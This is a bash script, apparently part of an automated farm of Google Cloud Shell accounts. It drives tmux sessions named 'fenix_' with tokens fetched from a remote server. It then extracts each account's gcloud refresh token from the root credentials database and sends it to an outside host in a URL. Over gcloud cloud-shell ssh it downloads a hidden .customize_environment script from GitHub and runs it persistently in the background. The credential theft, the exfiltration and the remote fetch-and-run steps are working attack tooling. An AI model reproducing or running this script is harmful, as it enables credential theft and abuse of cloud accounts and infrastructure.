#!/bin/bash

source http

path=$(pwd)
user=${path#/home/}

script=${0##*/} && script=${script%.*}
file='.'$script'.tmp'

session_name=($(tmux list-sessions -F "#{session_name}"))

i=0

while [ $i -lt ${#session_name[@]} ]
do

  session=${session_name[i]}

  if [[ $session =~ "fenix_" ]]
  then

     curl -s $ip'/token.php?session='$session > $file 

     token=$(jq '.token' $file)
     token=${token//'"'/}

     if [ $token != 'null' ]
     then

        source log.sh $session "$script > enviando token..."

        sleep 1

        tmux send -t $session $token C-m && source log.sh $session "$script > TMUX send ok"

        sleep 1

        source log.sh $session "$script > Token enviado!"
        
        while [ -z $new ]
        do
          source log.sh $session "$script > while gcloud config get-value account..."
          new=$(sudo gcloud config get-value account)
        done 
        
        source log.sh $session "$script > nova conta $new"
        
        while [ -z $refresh_token ]
        do
          sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
          refresh_token=$(jq '.refresh_token' $file)
          refresh_token=${refresh_token//'"'/}
          source log.sh $session "$script > obtendo refresh-token..."
        done
        
        source log.sh $session "$script > refresh-token ok!"
        
        url=$ip'/new.php?session='$session'&account='$new'&creator='$user'&refresh='$refresh_token
        curl $url && source log.sh $session "$script > post new.php"

        commandOK='false'

        command="sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"

        while [ $commandOK != 'true' ]
        do
          source log.sh $session "$script > while command..."
          sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true' && source log.sh $session "$script > command ok!"
        done

        url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
        curl $url && source log.sh $session "$script > post send_status.php"

     fi
     
     sleep 1
 
  fi
((i++))
done
